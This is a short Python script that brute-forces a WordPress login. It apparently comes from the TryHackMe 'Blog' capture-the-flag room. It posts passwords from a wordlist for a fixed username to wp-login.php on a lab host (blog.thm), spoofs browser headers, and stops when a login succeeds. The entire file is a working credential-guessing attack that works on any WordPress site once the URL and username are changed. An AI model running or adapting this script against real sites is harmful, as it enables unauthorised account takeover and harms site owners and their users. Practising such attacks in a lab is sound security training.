#!/usr/bin/env python3

"""
Weblogin_wordpress is a password bruteforce login script for wordpress.

Based on:
https://tryhackme.com/room/blog
"""


import sys
# import time
import requests


USERNAME = 'bjoel'
URL = 'http://blog.thm/wp-login.php'

DATA = {
    'wp-submit': 'Log In',
    'redirect_to': 'http://blog.thm/wp-admin/&testcookie=1',
}

# pylint: disable=line-too-long
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0', # noqa
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', # noqa
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://blog.thm',
    # 'Connection': 'keep-alive',
    'Referer': 'http://blog.thm/wp-login.php',
    'Cookie': 'wordpress_test_cookie=WP+Cookie+check',
    'Upgrade-Insecure-Requests': '1',
}


def main():
    """
    Start the program, open the passwords file
    and call the try_login() function for every
    password, until we get a login.
    """

    with open('passwords.txt', encoding='utf-8', errors='ignore') as file:
        for password in file:
            if password.isspace():
                continue
            try_login(URL, HEADERS, DATA, USERNAME, password)


def try_login(url, headers, data, username, password):
    """
    Try a set of credentials,
    print the likely status, login - yay or nay?
    """

    data['log'] = username
    data['pwd'] = password

    print(f"Trying: {username}:{password}")

    response = requests.post(url, headers=headers, data=data, timeout=10)

    text = response.text.lower()

    if "invalid" in text or "incorrect" in text or "empty" in text:
        print(f"[-] {username}:{password}")
    else:
        if response.status_code == 301:
            print(f"[+]: {username}:{password}")
            sys.exit()
        else:
            print(f"[?]: {username}:{password}")

    # time.sleep(0.05)


if __name__ == "__main__":
    main()
